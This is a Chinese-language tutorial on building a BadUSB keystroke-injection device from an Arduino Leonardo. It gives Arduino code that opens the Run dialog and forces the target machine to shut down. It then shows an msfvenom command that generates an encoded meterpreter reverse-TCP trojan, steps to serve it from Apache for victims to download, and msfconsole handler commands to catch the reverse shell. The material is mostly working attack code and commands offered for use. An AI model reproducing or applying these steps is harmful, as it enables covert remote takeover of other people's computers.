**什么是badusb？**

BadUSB是一种通过重写U盘固件伪装成USB输入设备（键盘，网卡）用于恶意用途的usb设备。

  

  

**攻击原理**

HID（Human Interface Device，是计算机直接与人交互的设备，例如键盘、鼠标等）攻击的一种。攻击者通过将USB设备模拟成为键盘，让电脑识别成为键盘，然后进行脚本模拟按键进行攻击。

**Arduino Leonardo制作**

Arduino Leonardo制作的流程大体上和digispark是一样的，但是需要稍微修改一些配置。

1\. 开发板需要修改为Arduino Leonardo

2\. 烧录时需要选择对应的端口

关机代码

#include <Keyboard.h>

void setup() {

Keyboard.begin();

delay(3000);

Keyboard.press(KEY\_LEFT\_GUI);

delay(500);

Keyboard.press('r');

delay(500);

Keyboard.release(KEY\_LEFT\_GUI);

Keyboard.release('r');

delay(500);

Keyboard.println("SHUTDOWN -S -F -T 0");

delay(5000);

Keyboard.press(KEY\_RETURN);

Keyboard.release(KEY\_RETURN);

Keyboard.end();

}

**远控木马制作**

在kali上利用msf生成木马，输入以下命令：

msfvenom -p windows/meterpreter/reverse\_tcp -e x86/shikata\_ga\_nai -i 12 -b ‘\\x00’ lhost=kali的IP lport=你想监听的端口 -f exe > /root/shell.exe

![](../Images/d7aa796b0d876f87605e0a0e87375df1.png)

2

  
  

**启动Apache2**

为了能够使受害者能够从服务器上下载shell.exe，需要启动Apache2，并将shell.exe复制到/var/www/html

server apache2 start

![](../Images/53e11bab50a3506b453c7c7f4867e324.png)

cp shell.exe /var/www/html/

![](../Images/e55221a4af0b00c6d3e61822defd862c.png)

3

  
  

**启动arduino IDE**

将代码烧录到Arduino Leonardo（文末附代码）

![](../Images/ff2778212327673e0a559f1d90d1b253.png)

4

  
  

**开启监听**

msfconsole

use exploit/multi/handler

set payload windows/meterpreter/reverse\_tcp

set lhost kali的IP

set lport 777（制作木马时的端口）

![](../Images/4e52ea8ac79dcfb8fac2edc171be5dba.png)

5
